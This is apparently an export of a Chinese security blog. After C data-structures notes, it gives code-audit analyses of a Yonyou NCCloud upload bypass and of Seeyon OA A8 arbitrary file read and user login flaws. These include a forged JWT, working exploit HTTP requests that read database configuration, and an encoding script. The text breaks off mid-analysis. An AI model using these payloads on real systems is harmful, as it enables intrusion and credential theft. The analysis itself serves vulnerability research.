（front+1）%数组的长度\n\n\n如何判断循环队列是否为空\n\n如果front与real的值相等，则该队列就一定为空\n\n\n如何判断循环链表是否已满\n\n预备知识\nfront的值可能比rear大\nfront的值也可能比real小\n当然也可能两者相等\n\n两种方式\n\n多增加一个表标识参数\n\n少用一个元素【通常使用第二种方式】\n如果r和f值紧挨着，则队列已满\n// C语言伪算法表示：if((r+1)%数组长度 == f)\t已满else\t未满\n\n\n\n\n\n\n\n队列的算法\n\n入队\n出队\n\n队列的具体应用\n\n所有和时间有关的操作都有队列的影子\n\n循环队列的实现\n# include &lt;stdio.h&gt;# include &lt;malloc.h&gt;typedef struct Queue&#123;\tint * pBase; \tint front;\tint real; &#125;QUEUE;void init(QUEUE *); // 初始化队列bool en_queue(QUEUE *, int); // 入队 bool is_full(QUEUE *); // 判断队列是否已满void traverse_queue(QUEUE *); // 遍历队列bool is_empty(QUEUE *); // 判断队列是否为空bool out_queue(QUEUE *, int *); // 出队 int main(void)&#123;\tQUEUE Q; \tint val;\tinit(&amp;Q);\ten_queue(&amp;Q, 1);\ten_queue(&amp;Q, 2);\ten_queue(&amp;Q, 3);\ten_queue(&amp;Q, 4);\ten_queue(&amp;Q, 5);\ten_queue(&amp;Q, 6);\ten_queue(&amp;Q, 7);\ten_queue(&amp;Q, 8);\ttraverse_queue(&amp;Q);\tout_queue(&amp;Q, &amp;val);\tout_queue(&amp;Q, &amp;val);\tif(out_queue(&amp;Q, &amp;val))&#123;\t\tprintf(\"出队成功， 出队的值为%d\\n\", val);\t&#125;else&#123;\t\tprintf(\"出队失败\\n\");\t&#125;\ttraverse_queue(&amp;Q);\treturn 0;&#125;// 初始化队列 void init(QUEUE * pQ)&#123;\tpQ-&gt;pBase = (int *)malloc(sizeof(int)*6);\tif(pQ-&gt;pBase == NULL)&#123;\t\tprintf(\"内存分配失败\\n\");\t\texit(-1);\t&#125;\tpQ-&gt;front = 0;\tpQ-&gt;real = 0;\treturn;&#125; // 判断队列是否已满bool is_full(QUEUE *pQ)&#123;\tif((pQ-&gt;real+1)%6==pQ-&gt;front)&#123;\t\t// 已满\t\treturn true; \t&#125;else&#123;\t\t// 未满\t\treturn false; \t&#125;&#125; // 入队bool en_queue(QUEUE *pQ, int val)&#123;\t// 判断队列是否已满 \tif(!is_full(pQ))&#123;\t\t// 未满\t\t\tpQ-&gt;pBase[pQ-&gt;real] = val;\t\tpQ-&gt;real = (pQ-&gt;real+1)%6;\t\treturn true; \t&#125; else&#123;\t\t// 已满\t\treturn false; \t&#125; \t\t&#125;  // 遍历队列void  traverse_queue(QUEUE * pQ)&#123;\tif(!is_empty(pQ))&#123;\t\tint i = pQ-&gt;front;\t\twhile(i!=pQ-&gt;real)&#123;\t\t\tprintf(\"%d  \", pQ-&gt;pBase[i]);\t\t\ti = (i+1)%6;\t\t&#125;\t\tprintf(\"\\n\");\t\t\t&#125;else&#123;\t\tprintf(\"队列为空\\n\"); \t&#125; \t\t &#125;// 判断队列是否为空bool is_empty(QUEUE * pQ)&#123;\tif(pQ-&gt;front == pQ-&gt;real)&#123;\t\t// 为空\t\treturn true; \t&#125;else&#123;\t\t// 不为空 \t\treturn false;\t&#125;&#125;// 出队bool out_queue(QUEUE * pQ, int * val)&#123;\tif(!is_empty(pQ))&#123;\t\t// 非空\t\t\t*val = pQ-&gt;pBase[pQ-&gt;front];\t\tpQ-&gt;front = (pQ-&gt;front +1)%6;\t\treturn true;\t&#125;else&#123;\t\t// 空 \t\treturn false;  \t\t \t&#125; &#125;\n\n专题-&gt;递归定义\n\n一个函数自己直接或间接调用自己\n\n递归满足三个条件\n\n递归必须得有一个明确的中止条件\n该函数所处理的数据规模必须在递减\n这个转化必须是可解的\n\n循环和递归\n递归\n\n易于理解\n速度慢\n存储空间大\n\n循环\n\n不易理解\n速度慢\n存储空间小\n\n使用递归的例子\n\n求阶乘\n1+2+3+4+…100的和\n汉诺塔\n走迷宫\n\n递归的应用\n\n树和森林就是以递归的方式定义的\n树和图的很多算法都是以递归来实现的\n很多数学公式就是以递归的方式定义的\n\n模块二：非线性结构树树定义\n专业定义\n有且只有一个称为根的节点\n有若干个互不相交的子树，这些子树本身也是一颗树\n\n\n通俗定义\n树是由节点和边组成\n每个节点只有一个父节点但是可以有多个子节点\n但有一个节点例外，该节点例外，该节点没有父节点，此节点称为根节点\n\n\n\n专业术语节点    父节点    字节点\n子孙    堂兄弟\n深度\n​    从根节点到最底层节点的层数称为深度\n​    根节点是第一层\n叶子节点\n​        没有子节点的节点\n非终端节点\n​        实际就是非叶子节点\n度\n​        子节点的个数称为度\n树分类\n一般树\n任意一个节点的子节点的个数都不受限制\n\n\n二叉树\n任意一个节点的子节点个数最多两个，且子节点的位置不可更改\n分类\n一般二叉树\n满二叉树\n在不增加树的层数前提下，无法再多添加一个节点的二叉树就是满二叉树\n\n\n完全二叉树\n如果只是删除了满二叉树最底层最右边的连续若干个节点，这样形成的二叉树就是完全二叉树\n\n\n\n\n\n\n森林\nn个互不相交的树的集合\n\n\n\n树的存储\n二叉树的存储\n\n连续存储【完全二叉树】\n优点\n查找某个节点的父节点和子节点(也包括判断有没有父节点和子节点)速度很快\n\n\n缺点\n耗用内存空间\n\n\n\n\n\n\n一般树存储\n\n双亲表示法\n\n求父节点方便\n\n\n\n\n孩子表示法\n\n求子节点方便\n\n\n\n双亲孩子表示法\n\n求父节点和子节点都很方便\n\n\n\n二叉树表示法\n\n把一个普通树转化成二叉树来存储\n具体转换方法：\t设法保证任意一个节点的\t\t左指针域指向它的第一个孩子节点\t\t右指针域指向它的下一个兄弟节点    只要能满足此条件，就可以把一个普通树转化成为二叉树    一个普通树转化成的二叉树一定没有右子树\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n森林的存储\n\n先把森林转化为二叉树，再存储二叉树。\n\n\n\n二叉树操作\n遍历\n\n先序遍历\n先访问根节点再先序访问左子树再先序访问右子树\n\n\n\n\n\n\n\n\n\n\n\n\n\n中序遍历\n先中序遍历左子树再访问根节点再中序遍历右子树\n\n\n\n\n\n\n\n\n\n\n\n后序遍历\n先中序遍历左子树再中序遍历右子树再访问根节点\n\n\n\n\n\n\n\n\n\n\n\n已知两种遍历序列求原始二叉树\n\n通过 先序遍历 和 中序遍历 或者 中序遍历 和后序遍历 我们可以还原出原始二叉树\n但是通过先序遍历 和 后续遍历 无法还原出原始二叉树\n\n已知先序和中序求后序\n先序：ABCDEFGH中序：BDCEAFHG求后序：？\n\n\n\n\n\n\n\n\n\n\n\n  先序：ABDGHCEFI中序：GDHBAECIF后序：？\n\n\n  \n  已知中序和后序求先序\n  中序：BDCEAFHG后序：DECBHGFA先序：？\n\n\n  \n图\n待学习…\n\n排序算法冒泡排序实现代码# include &lt;stdio.h&gt;// 两个冒泡排序区别是：一个是把排序后的值往前冒， 一个是往后冒。// 这个是往前冒 int main(void)&#123;\tint arr[5] = &#123;23, 55, -44, 18,  32&#125;;\tint i,j,t;\t\tprintf(\"排序前：\\n\");\tfor(i =0; i&lt;5;i++)&#123;\t\tprintf(\"%d \", arr[i]);\t&#125;\tprintf(\"\\n\");\tfor(i=0;i&lt;5;i++)&#123;\t\tfor(j=i+1;j&lt;5;j++)&#123;\t\t\tif(arr[i]&gt;arr[j])&#123;\t\t\t\tt = arr[i];\t\t\t\tarr[i] = arr[j];\t\t\t\tarr[j] = t;\t\t\t&#125;\t\t&#125;\t&#125; \tprintf(\"排序后：\\n\");\tfor(i =0; i&lt;5;i++)&#123;\t\tprintf(\"%d \", arr[i]);\t&#125;\t&#125;\n\n# include &lt;stdio.h&gt;// 两个冒泡排序区别是：一个是把排序后的值往前冒， 一个是往后冒// 这个是往后冒 int main(void)&#123;\tint a[] = &#123;23, -45, 67, -22, 48, 45&#125;;\tint i,j,t;\t\tprintf(\"排序前：\\n\");\tfor(i = 0; i&lt;5;i++)&#123;\t\tprintf(\"%d \", a[i]);\t&#125;\tprintf(\"\\n\");\t\tfor(i = 0 ; i&lt;5; i++)&#123;\t\tfor(j=0; j&lt;=i-1;j++)&#123;\t\t\tif(a[i]&lt;a[j])&#123;\t\t\t\tt = a[i];\t\t\t\ta[i] = a[j];\t\t\t\ta[j] = t;\t\t\t&#125;\t\t&#125;\t&#125;\t\tprintf(\"排序后：\\n\");\tfor(i = 0; i&lt;5;i++)&#123;\t\tprintf(\"%d \", a[i]);\t&#125;\t\t\treturn 0;&#125;\n\n快速排序原理图\n\n\n\n\n\n\n实现代码# include &lt;stdio.h&gt;void QuickSort(int * a, int low, int high);int FindPos(int * a, int low, int high);int main(void)&#123;\tint a[] = &#123;5,2,6,8,4,3,7&#125;;\t\t// 快速排序\tQuickSort(a, 0, 6); \tfor(int i=0;i&lt;7;i++)&#123;\t\tprintf(\"%d \", a[i]);\t&#125;\tprintf(\"\\n\");\t\treturn 0;&#125;/*\t从H开始 \tval比 H大移 小赋值\tval比L小移 大赋值\t判断L == H  \t*/// 快速排序void QuickSort(int * a, int low, int high)&#123;\tint pos;\tif(low &lt; high)&#123;\t\tpos = FindPos(a, low, high);\t\tQuickSort(a, low, pos-1);\t\tQuickSort(a, pos+1, high);\t&#125;\t&#125;// 用于查找首个元素排序后的下标位置int FindPos(int * a, int low, int high)&#123;\tint val = a[low];\tint temp;\twhile(low&lt;high)&#123;\t\twhile(low&lt;high &amp;&amp; a[high]&gt;=val)&#123;\t\t\thigh --;\t\t&#125;\t\ta[high]  = a[low];\t\twhile(low&lt;high &amp;&amp; a[low]&lt;=val)&#123;\t\t\tlow ++;\t\t&#125;\t\ta[low] = a[high];\t&#125;\treturn low;\t&#125;\n\n插入排序选择排序归并排序查找算法\n待学习…\n\n","categories":["数据结构"],"tags":["C/C++","数据结构"]},{"title":"用友NCCloud 权限绕过importhttpscer接口任意文件上传","url":"/2024/04/03/%E7%94%A8%E5%8F%8BNCCloud%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87importhttpscer%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20/","content":"环境nc cloud 2105\n漏洞利用点sink点在nccloud.web.pfxx.manualload.action.ImportHttpsCertAction的doAction方法中，获取上传的文件，根据上传所指定的文件名，创建文件并写入，并未做任何后缀的过滤，可指定上传文件名跨目录将文件写入到任意路径下。\n\n\n\n\n\n\n\nwebfile.getFileName()是从上传的数据包中获取文件名。\n\n\n\n\n\n\n\n路由分析在hotwebs/nccloud/WEB-INF/web.xml配置中，请求路径为/nccloud/mob/*可以调用到nccloud.framework.mob.action.entry.MobController类。\n\n\n\n\n\n\n\n跟入到MobController方法中，doPost方法中，调用了MobDispatcher.doAction方法。\n\n\n\n\n\n\n\n在MobDispatcher的doAction方法中，调用了this.excute(operator)方法。\n\n\n\n\n\n\n\n主要逻辑实现在execte方法中，首先调用operator.getRequest()拿到IMobRequest，这个对象封装一些方法用于操作Request对象；\n\n\n\n\n\n\n\n这里的operator是由MobHttpOperator.getInstance()创建，默认的request属性为null，之所以能拿到request，是因为在请求过程中会经过nccMobileFilter过滤器，在doFilter方法中调用了operator.bind方法绑定了Request对象。\n\n\n\n\n\n\n\n然后会调用request.getAction()，获取到请求URI的后缀。\n\n\n\n\n\n\n\n在getAction方法中，首先是拿到了请求的URI，判断URI中是否包含/nccloud/mob/，然后以/nccloud/mob/分割URI，取到/nccloud/mob/的后缀，如/nccloud/mob/pfxx/manualload/importhttpscer，那么拿到的就是/pfxx/manualload/importhttpscer，最后再以/进行分割，最后在拼接回去并返回；这样做的目的可能是规避后续通过path查找出错的可能。\n\n\n\n\n\n\n\n后续会调用Locator.find(IActionResource.class)，获取到IActionResource对象。\n\n\n\n\n\n\n\n根据传入的IActionResource.class 创建IActionResource对象并返回\n\n\n\n\n\n\n\n然后会以request.getAction()返回的路径作为参数调用resource.find(name)，name也是截取到的uri，通过uri查找对应的ActionDefine对象，resource为ActionResource对象，调用的是ActionResource对象的find方法。。\n\n\n\n\n\n\n\n跟入ActionResource的find方法中，调用了ActionDefine.resolveRequest，将截取到的URI分割成长度为3的字符数组，组合成特定格式，从Cache中查找对应的ActionDefine对象并返回。\n\n\n\n\n\n\n\n\n\n\n\n\n\n然后回到MobDispatcher的excute方法中，ActionDefine对象的父类不为IMobileAction和IMobAuthenticateAction的情况下会走到excutor.excute(define.getInstance(), webOperator)。\n\n\n\n\n\n\n\n这个方法会根据ActionDefine对象的父类，创建不同的对象，并调用该对象的excute方法，nccloud.web.pfxx.manualload.action.ImportHttpsCertAction实现的接口为ICommonAction，创建的是CommonActionExcutor对象，并调用excute方法。\n\n\n\n\n\n\n\n\n\n\n在nccloud.framework.web.action.excutor.CommonActionExcutor的excute方法中，这个方法会调用action的doAction方法，这里的action为截取的uri，并从Cache中查找到的ActionDefine对象。\n\n\n\n\n\n\n\n权限绕过在web.xml中，访问/mob/*，会经过nccMobileFilter过滤器。\n\n\n\n\n\n\n\nplatform/mob/login等登录接口，会直接执行doFilter。其他接口访问需要在Header头中添加accessToken，否则会返回401。\n\n\n\n\n\n\n\n在获取到token的情况下，会进入到如下分支，创建MobClientInfo对象，调用getter方法获取一些值，这里获取了mobuserid的值进行判断，mobuserid如果不为null，然后会验证传入的token，不一致报异常并返回，这里的验证也存在一些风险，假设没获取到mobuserid，也会执行后续的doFilter绕过对Token的检查，mobuserid是调用(new MobClientInfo()).getMobUserId()获取的，跟入到getMobUserId方法中。。\n\n\n\n\n\n\n\nMobContext可能是个全局变量，首先会调用该变量中的getMobuserid方法获取值，如果没获取到，才会调用this.getAttributeValue(mobuserid, true)从Token中获取。\n\n\n\n\n\n\n\n在getAttributeValue方法中，拿到Token，调用JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, attributeName)获取mobuserid的值。\n\n\n\n\n\n\n\nprivate Object getAttributeValue(String attributeName, boolean isString) &#123;\tString token = MobHttpOperator.getInstance().getToken();\tif (StringUtils.isEmpty(token)) &#123;\t\treturn null;\t&#125; else &#123;\t\treturn this.accessToken.containFiled(attributeName) ? JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, attributeName) : null;\t&#125;&#125;\n\n在getClaimFromToken方法中，调用this.jwtProperties.getSecret()获取密钥，解析传入的JwtToken，获取JWT的主体部分并返回。\n\n\n\n\n\n\n\n在JwtProperties.class中，jwt的密钥被设为硬编码defaultSecret，通过此密钥，可以伪造jwt数据，在JwtToken中不包含mobuserid，默认会返回null，后续判断即可绕过对Token的校验，直接执行doFilter。\n\n\n\n\n\n\n\n在JwtTokenUtil.class类中，调用generateToken方法可生成一段符合需求的jwt数据。\n\n\n\n\n\n\n\neyJhbGciOiJIUzUxMiJ9.eyJyYW5kb21LZXkiOiIxIiwic3ViIjoiYWRtaW4iLCJleHAiOjU4MDQ3MzU0NzAsImlhdCI6MTcxMjEzNjEyMX0.c6rYljcqHxfXbF0XTwDagJHFSy3ZOmyRBpyIlbCBADTmKEXDEURfzrBSPMybJg_Ho5QTW8cIxXw9F06TT6BvAA\n\n\n\n\n\n\n\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"致远OA A8-V5 任意文件读取漏洞分析","url":"/2023/04/26/%E8%87%B4%E8%BF%9COA%20A8-V5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"致远OA A8-V5 任意文件读取漏洞分析漏洞环境致远A8 V7.0\n漏洞利用读取./../../base/conf/datasourceCtp.properties路径下的数据库配置文件\nPOST /seeyon/officeservlet HTTP/1.1Host: 10.0.103.21Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=98FCAEBB95CCBEB2C7209BEF7EAA7B3E; loginPageURL=x-forwarded-for: 127.0.0.1x-originating-ip: 127.0.0.1x-remote-ip: 127.0.0.1x-remote-addr: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 350DBSTEP V3.0     285             0               0              RECORDID=wLoiCREATEDATE=wLehP4whzUoiw=66originalFileId=wLoineedReadFile=yRWZdAS6originalCreateDate=wLehP4whzUoiw=66OPTION=LKDxOWOWLlxwVlOWTEMPLATE=qf85qf85qfDfeazQqAzvcRevy1W3eazvNaMUySz3d7TsdRDsyaM3nYliCOMMAND=BSTLOlMSOCQwOV66affairMemberId=wLoiaffairMemberName=wLoi\n\n\n\n\n\n\n\n\n读取出数据库密码/1.0/VWZ0dTIzNC8=，经过加密，再github上下载解密脚本，解密就可以拿到明文密码。\nhttps://github.com/Rvn0xsy/PassDecode-jar\n\n\n\n\n\n\n\n漏洞分析exp中的请求路径为/seeyon/officeservlet\n在web.xml中搜索 officeservlet\n\n\n\n\n\n\n\n找到接口映射到对应的类，跟入 com.seeyon.ctp.common.office.OfficeServlet文件\npublic class OfficeServlet extends HttpServlet &#123;    private static Log log = LogFactory.getLog(OfficeServlet.class);    public OfficeServlet() &#123;    &#125;    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;        AppContext.initSystemEnvironmentContext(request, response);        HandWriteManager handWriteManager = (HandWriteManager)AppContext.getBeanWithoutCache(\"handWriteManager\");        iMsgServer2000 msgObj = new iMsgServer2000();        try &#123;            handWriteManager.readVariant(request, msgObj);            if (AppContext.currentUserId() == -1L) &#123;                User user = handWriteManager.getCurrentUser(msgObj);                AppContext.putThreadContext(\"SESSION_CONTEXT_USERINFO_KEY\", user);            &#125;            String option = msgObj.GetMsgByName(\"OPTION\");            if (\"LOADFILE\".equalsIgnoreCase(option)) &#123;                handWriteManager.LoadFile(msgObj);            &#125; else &#123;                String mLabelName;                if (\"SAVEFILE\".equalsIgnoreCase(option)) &#123;                    mLabelName = msgObj.GetMsgByName(\"clientVer\");                    mLabelName = mLabelName.replace('.', ',');                    log.info(\"保存office正文的时候，插件版本校验,服务器handwrite版本为:[\" + iMsgServer2000.Version() + \"] ,客户端版本为：[\" + mLabelName + \"]\");                    handWriteManager.saveFile(msgObj);                &#125; else if (\"LOADSIGNATURE\".equalsIgnoreCase(option)) &#123;                    handWriteManager.LoadDocumentSinature(msgObj);                &#125; else if (\"LOADMARKLIST\".equalsIgnoreCase(option)) &#123;                    handWriteManager.LoadSinatureList(msgObj);                &#125; else if (\"LOADMARKIMAGE\".equalsIgnoreCase(option)) &#123;                    handWriteManager.LoadSinature(msgObj);                &#125; else if (\"LOADTEMPLATE\".equalsIgnoreCase(option)) &#123;                    handWriteManager.taoHong(msgObj);                &#125; else if (\"SAVESIGNATURE\".equalsIgnoreCase(option)) &#123;                    handWriteManager.saveDocumentSignatureRecord(msgObj, request);                &#125; else &#123;                    String mFileName;                    if (\"INSERTFILE\".equalsIgnoreCase(option)) &#123;                        mLabelName = msgObj.GetMsgByName(\"bookMarkName\");                        mFileName = msgObj.GetMsgByName(\"fileUrl\");                        if (Strings.isNotBlank(mLabelName) &amp;&amp; Strings.isNotBlank(mFileName)) &#123;                            msgObj.SetMsgByName(\"POSITION\", mLabelName);                            File tempFile = new File(mFileName);                            if (tempFile.exists() &amp;&amp; tempFile.isFile()) &#123;                                msgObj.MsgFileLoad(mFileName);                            &#125;                            msgObj.SetMsgByName(\"STATUS\", \"插入文件成功!\");                            msgObj.MsgError(\"\");                        &#125; else &#123;                            handWriteManager.LoadFile(msgObj);                            msgObj.SetMsgByName(\"POSITION\", \"Content\");                            msgObj.SetMsgByName(\"STATUS\", \"插入文件成功!\");                            msgObj.MsgError(\"\");                        &#125;                    &#125; else if (\"INSERTIMAGE\".equalsIgnoreCase(option)) &#123;                        handWriteManager.insertImage(msgObj, request);                    &#125; else if (\"INSERTIMAGEEX\".equalsIgnoreCase(option)) &#123;                        mLabelName = msgObj.GetMsgByName(\"LABELNAME\");                        mFileName = msgObj.GetMsgByName(\"IMAGENAME\");                        String inputType = msgObj.GetMsgByName(\"inputType\");                        if (\"image\".equals(inputType)) &#123;                            String createDate = msgObj.GetMsgByName(\"createDate\");                            handWriteManager.insertImg(msgObj, mFileName, mLabelName, createDate);                        &#125; else if (\"barcode\".equals(inputType)) &#123;                            handWriteManager.insertBarcode(msgObj, mFileName, mLabelName);                        &#125; else if (\"handwrite\".equals(inputType)) &#123;                            handWriteManager.insertHandWriteImg(msgObj, mFileName, mLabelName);                        &#125;                    &#125; else if (\"SAVEPDF\".equalsIgnoreCase(option)) &#123;                        handWriteManager.saveFile(msgObj);                    &#125; else if (\"PUTFILE\".equalsIgnoreCase(option)) &#123;                        handWriteManager.saveClientFile(msgObj);                    &#125;                &#125;            &#125;            handWriteManager.sendPackage(response, msgObj);        &#125; catch (Exception var10) &#123;            log.error(\"\", var10);            msgObj = new iMsgServer2000();            msgObj.MsgError(\"saveFaile\");            handWriteManager.sendPackage(response, msgObj);        &#125;        AppContext.clearThreadContext();    &#125;    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;        this.doGet(request, response);    &#125;&#125;\n\n在这个继承了HttpServlet类中,主要功能都实现在doGet中。\n代码当中有很多看不懂的地方很正常，我们只需要重点关注漏洞利用点，和恶意数据到达利用点的路径就可以了。\n从前端拿到参数的关键 在33行 \n\n\n\n\n\n\n\nhandWriteManager.readVariant(request, msgObj);\n\n 这条语句大致作用就是从给handWriteManager类中一些属性进行赋值，跟进这个方法中\n\n\n\n\n\n\n\n调用了msgObj.ReadPackage(request)去解析request中的数据，看看是怎么解析的，继续跟进\n\n\n\n\n\n\n\n在这个方法中，先是判断http请求体的长度，再将http请求体的内容读取到this.FStream属性中，然后判断this.FError是否为空串，再初始化这个类时，会将this.FError赋值为空串。\n\n\n\n\n\n\n\n所以这里一定会调用this.StreamToMsg()方法，跟进该方法中。\nprivate boolean StreamToMsg() &#123;        byte var2 = 64;        boolean var3 = false;        boolean var4 = false;        boolean var5 = false;        boolean var6 = false;        String var7 = \"\";        String var8 = \"\";        this.FMd5Error = false;        try &#123;            int var14 = 0;            // 读取http请求体中前64位            String var1 = new String(this.FStream, var14, var2);            // 0-15 位为版本号            this.FVersion = var1.substring(0, 15);            // 16-31 为 this.FMsgText这个值的长度            // 假设this.FMsgText值为100 那么需要再这个位置指定值为100 否则再后期就会读取不到            int var11 = Integer.parseInt(var1.substring(16, 31).trim());            // 32-47 读取 this.FError的长度             int var12 = Integer.parseInt(var1.substring(32, 47).trim());            // 48-63 则是指定 this.FMsgFile的长度            int var13 = Integer.parseInt(var1.substring(48, 63).trim());            this.FFileSize = var13;            //  这里的var14 为 0+64=64            var14 += var2;            if (var11 &gt; 0) &#123;                // 从64位开始读取 读取var11的值                // 这里读取的                this.FMsgText = new String(this.FStream, var14, var11);            &#125;            var14 += var11;            if (var12 &gt; 0) &#123;                this.FError = new String(this.FStream, var14, var12);            &#125;            var14 += var12;            this.FMsgFile = new byte[var13];            if (var13 &gt; 0) &#123;                for(int var9 = 0; var9 &lt; var13; ++var9) &#123;                    this.FMsgFile[var9] = this.FStream[var9 + var14];                &#125;                var14 += var13;                if (this.FStream.length &gt;= var14 + 32) &#123;                    var7 = new String(this.FStream, var14, 32);                    var8 = this.MD5Stream(this.FMsgFile);                    if (var7.compareToIgnoreCase(var8) != 0) &#123;                        this.SetMsgByName(\"DBSTEP\", \"ERROR\");                        this.FMd5Error = true;                    &#125; else &#123;                        this.FMd5Error = false;                    &#125;                &#125;            &#125;            return true;        &#125; catch (Exception var10) &#123;            this.FError = this.FError + var10.toString();            System.out.println(var10.toString());            return false;        &#125;    &#125;\n\n上面这段代码中就像是在http请求体中圈地一样，先是指定了http请求体前64为来存储this.FVersion、this.FMsgText的长度、this.FError的长度、this.FMsgFile的长度。后面则是根据指定的长度在http请求体64位之后切割并赋值给对应的属性，文件读取所获取的路径只需要通过这里this.FMsgText里拿，我们只需要赋值给this.FMsgText。其余则都属性的长度都赋值为0，这样可跳过对对应属性进行赋值。\n完成而后又回到readVariant方法中\n\n\n\n\n\n\n\n在后续的赋值操作中，通过传递对应字符串调用msgObj.GetMsgByName 方法从this.FMsgText属性中获取值。这里再获取值的时候也是做了一些操作的，我们跟入msgObj.GetMsgByName方法中。\npublic String GetMsgByName(String var1) &#123;        boolean var2 = false;        boolean var3 = false;        String var4 = \"\";        String var6 = var1.trim().concat(\"=\");        int var7 = this.FMsgText.indexOf(var6);        if (var7 != -1) &#123;            int var8 = this.FMsgText.indexOf(\"\\r\\n\", var7 + 1);            var7 += var6.length();            if (var8 != -1) &#123;                String var5 = this.FMsgText.substring(var7, var8);                var4 = this.DecodeBase64(var5);                return var4;            &#125; else &#123;                return var4;            &#125;        &#125; else &#123;            return var4;        &#125;    &#125;\n\n在这段代码中，其实就是在this.FMsgText获取值，在this.FMsgText这个属性中通过关键字=的方式去获取关键字=xxx中的xxx，并且对xxx进行了DecodeBase64解密，这个解码并不是常见的base64解码方式，而且变种过的base64编码，也就是说当我们传递参数值的时候，还需要对xxx进行EncodeBase64加密。\n这篇文章中详细讲了致远 OA 变种 BASE64 算法的加解密方法\nhttps://paper.seebug.org/964/\n文章中给出了一个加解密的脚本\nvar a = \"gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6\";var b = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";var c = \"OKMLlKlV\";var d = \"\";function a2b(v) &#123;    for (var i = 0; i &lt; a.length; i++) &#123;        if (a[i] == v) &#123;            return b[i];        &#125;    &#125;&#125;function b2a(v) &#123;    for (var i = 0; i &lt; b.length; i++) &#123;        if (b[i] == v) &#123;            return a[i];        &#125;    &#125;&#125;for (var i = 0; i &lt; c.length; i++) &#123;    d = d + a2b(c[i]);&#125;\n\n这个脚本a2b是解密，得到是正常的base64编码值，b2a是加密，得到的是加密后的值。c保存的是需要被加密或者解密的值，d则是最后转换的结果。\n所以在后续构造文件读取路径的时候，需要通过该加密脚本对路径进行加密。\n经过前面的分析，我们已经知道了request请求是如何被解析了以及在获取值的时候做了解密的操作操作，接下来回到OfficeServlet类中\n\n\n\n\n\n\n\n这里获取OPTION的值，而后会根据得到的值调用对应的方法。\n关键点 在56行\n\n\n\n\n\n\n\n这里调用了handWriteManager.taoHong方法，跟入\n\n\n\n\n\n\n\n也是获取了TEMPLATE、COMMAND、affairMemberId、affairMemberName的值，随后传入了officePath调用了msgObj.MsgFileLoad(officePath)，继续跟入\npublic boolean MsgFileLoad(String var1) &#123;        try &#123;            File var2 = new File(var1);            int var3 = (int)var2.length();            int var4 = 0;            this.FMsgFile = new byte[var3];            FileInputStream var5;            // 打开路径下的文件 并将文件的值读入this.FMsgFile中            for(var5 = new FileInputStream(var2); var4 &lt; var3; var4 += var5.read(this.FMsgFile, var4, var3 - var4)) &#123;            &#125;            var5.close();            this.FFileSize = var3;            return true;        &#125; catch (Exception var6) &#123;            this.FError = this.FError + var6.toString();            System.out.println(var6.toString());            return false;        &#125;    &#125;\n\n这个方法大致功能传入一个文件路径，然后文件的值读取到this.FMsgFile属性中。\n而这也是照成文件读取关键的一个点，根据这里往后推，文件的路径可通过TEMPLATE变量拿到，而TEMPLATE则可以通过关键字TEMPLATE在msgObj.GetMsgByName 方法中拿到，而GetMsgByName这个方法本身是在this.FMsgText这个属性中获取值，而this.FMsgText则是在http请求体中截取的值，而http请求体我们可控。到目前为止，我们可以通过http请求体控制文件路径来读取对应文件，但是还差一步，怎么回显文件内容。\n在 OfficeServlet.class 类\n\n\n\n\n\n\n\n在101行调用了handWriteManager.sendPackage(response, msgObj)，我们跟入\n\n\n\n\n\n\n\n调用了msgObj.SendPackage(response) 再次跟入\n\n\n\n\n\n\n\n这里会调用this.MsgVariant()将结果写入到http响应中。我们跟入 this.MsgVariant()\n\n\n\n\n\n\n\n这里返回了this.FStream 的值，作为返回到前端的内容。\n跟入this.MsgToStream中\n\n\n\n\n\n\n\n通过FMsgText、FError、FFileSize创建了字节数组输出流，然后写入了FMsgText、FError以及最关键也就是文件读取内容赋值的变量FMsgFile，最后都赋值给了FStream，然后在MsgVariant方法中被返回到前端，以上就是整个任意文件读取漏洞的原理分析。\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"致远OA A8-V5 任意用户登录漏洞分析","url":"/2023/04/27/%E8%87%B4%E8%BF%9COA%20A8-V5%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"致远OA A8-V5 任意用户登录漏洞分析漏洞环境致远A8 V7.0\n漏洞利用接口 /seeyon/thirdpartyController.do\nGET /seeyon/thirdpartyController.do?method=access&amp;enc=TT5uZnR0YmhmL21qb2wvY2N0L3BxZm8nTj4uODM4NDE0MzEyNDM0NTg1OTI3OSdVPjI3OTM2MjU4MjQ4ODY= HTTP/1.1Host: 10.0.103.21Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close\n\n可以在响应包中得到一个JSESSIONID，在携带JSESSIONID 